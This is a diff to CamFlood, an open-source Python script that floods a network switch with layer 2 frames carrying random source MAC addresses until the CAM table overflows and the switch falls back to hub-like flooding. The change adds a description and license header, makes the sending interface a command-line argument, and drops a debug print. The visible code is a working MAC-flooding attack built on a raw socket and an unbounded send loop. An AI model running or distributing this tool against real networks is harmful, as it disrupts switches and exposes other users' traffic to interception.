@@ -1,5 +1,8 @@
 #!/usr/bin/env python
 """
+    Tool that sends out layer 2 frames with alternating source mac adresses, with the intention of filling up the cam table of a switch dropping it to hub mode
+    Copyright (C) 2015  Bram Staps (Glasswall B.V.)
+
     This file is part of CamFlood
     CamFlood is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
@@ -24,6 +27,7 @@ import socket
 
 
 parser = argparse.ArgumentParser()
+parser.add_argument("interface", help="The sending interface", type=str)
 parser.add_argument("--mac", help="which mac to send to (default = Broadcast)")
 parser.add_argument("--interval", help="interval between packets in seconds (default = 0, 0 = as fast as possible)")
 parser.add_argument("--count", help="How Manny packets to send in total (default = 0, 0 = infinite)")
@@ -50,14 +54,13 @@ prelogue = mac.replace(":", "").decode("hex")
 epilogue = "1337FFFFFFFFFFFF".decode("hex")
 
 sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-sock.bind(("eth0",0))  
+sock.bind((args.interface,0))  
     
 
 def loop():
     sock.send(prelogue + struct.pack("L", random.getrandbits(8*6) & 0xFFFFFFFFFFFE )[:6] + epilogue)
     if interval: sleep(interval)
         
-print count
 if count:
     for x in xrange(count):
         loop()
